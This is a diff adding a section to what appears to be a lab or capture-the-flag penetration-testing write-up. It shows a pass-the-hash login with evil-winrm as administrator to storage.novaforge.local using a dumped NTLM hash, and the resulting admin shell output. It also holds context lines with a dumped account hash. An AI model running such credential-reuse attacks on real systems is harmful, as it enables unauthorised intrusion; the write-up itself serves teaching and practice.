@@ -1033,4 +1033,21 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8
 
 Now back on ntlmrelayx i have the SAM hive and the local admin hash!
 
+# Access as the local admin on the storage server
+
+```python
+evil-winrm -i storage.novaforge.local -u administrator -H 'd5cad8a9782b2879bf316f56936f1e36'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+I now have access as the local admin!
+
 
